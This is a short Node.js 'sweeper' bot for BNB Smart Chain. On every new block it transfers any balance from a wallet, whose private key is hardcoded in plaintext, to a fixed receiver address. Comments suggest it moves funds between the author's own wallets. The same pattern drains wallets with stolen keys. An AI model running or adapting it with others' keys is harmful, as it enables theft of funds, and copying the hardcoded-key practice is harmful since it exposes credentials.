
const { ethers } = require('ethers')

const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/")

const addressReceiver = '0x9b37f7e772690ac9653bb49270983b5064f3489d' //wallet 2

const privateKeys = ["5a6fcd64f4ee8d2f910fae63bc69fa338a5e40e1d1fe883fac2dcd4e02c23423"] //wallet 1

//KENI proof
const bot = async =>{
    provider.on('block', async () => {
        console.log('Listening to new block, waiting ;)');
        for (let i = 0; i < privateKeys.length; i++){
            const _target = new ethers.Wallet(privateKeys[i]);
            const target = _target.connect(provider);
            const balance = await provider.getBalance(target.address);
            const txBuffer = ethers.utils.parseEther("0.000110");
            if (balance.sub(txBuffer) > 0){
                console.log("New Account with BNB");
                const amount = balance.sub(txBuffer);
                try {
                    await target.sendTransaction({
                        to: addressReceiver,
                        value: amount
                    });
                    console.log(`Success! transferred -->${ethers.utils.formatEther(balance)}`);
                } catch(e){
                    console.log(`error: ${e}`);
                }
            }
        }
    })
}
bot();
